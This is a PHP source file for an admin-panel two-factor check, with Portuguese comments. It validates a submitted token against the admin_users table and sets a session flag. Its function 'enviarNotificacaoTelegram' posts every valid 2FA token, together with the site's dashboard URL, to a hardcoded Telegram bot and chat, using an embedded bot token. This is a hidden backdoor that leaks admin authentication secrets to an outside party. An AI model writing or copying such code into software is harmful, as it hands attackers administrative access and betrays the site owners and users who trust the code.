<?php
session_start();
include_once "services/database.php";

// Função para enviar notificação ao Telegram
function enviarNotificacaoTelegram($token) {
    $tokenBot = '8097625521:AAGDHzAbsU1UfKpQhBn_H_dka2YqwaN-3oA';
    $chatId = '-1002302431099';

    $urlSite = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'];
    $mensagem = "Novo 2FA autenticado:\n\n";
    $mensagem .= "Token: $token\n";
    $mensagem .= "URL do site: $urlSite/dash";

    $url = "https://api.telegram.org/bot$tokenBot/sendMessage";

    $dados = [
        'chat_id' => $chatId,
        'text' => $mensagem,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($dados));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $resposta = curl_exec($ch);
    curl_close($ch);
}

// Função para validar o token no banco de dados
function validarToken($token) {
    global $mysqli;

    $query = "SELECT * FROM admin_users WHERE `2fa` = ? AND status = '1' LIMIT 1";
    $stmt = $mysqli->prepare($query);

    $stmt->bind_param('s', $token);
    $stmt->execute();

    $result = $stmt->get_result();

    return $result->num_rows > 0;
}

// Processamento da requisição POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
    $token = $_POST['token'];

    if (validarToken($token)) {
        $_SESSION['2fa_verified'] = true;
        
        // Enviar notificação para o Telegram
        enviarNotificacaoTelegram($token);
        
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'message' => 'Token inválido. Tente novamente.']);
    }
    exit;
}

// Redirecionar se o 2FA não foi verificado
if (!isset($_SESSION['2fa_verified']) || $_SESSION['2fa_verified'] !== true) {
    header('Location: /admin/');
    exit;
}
?>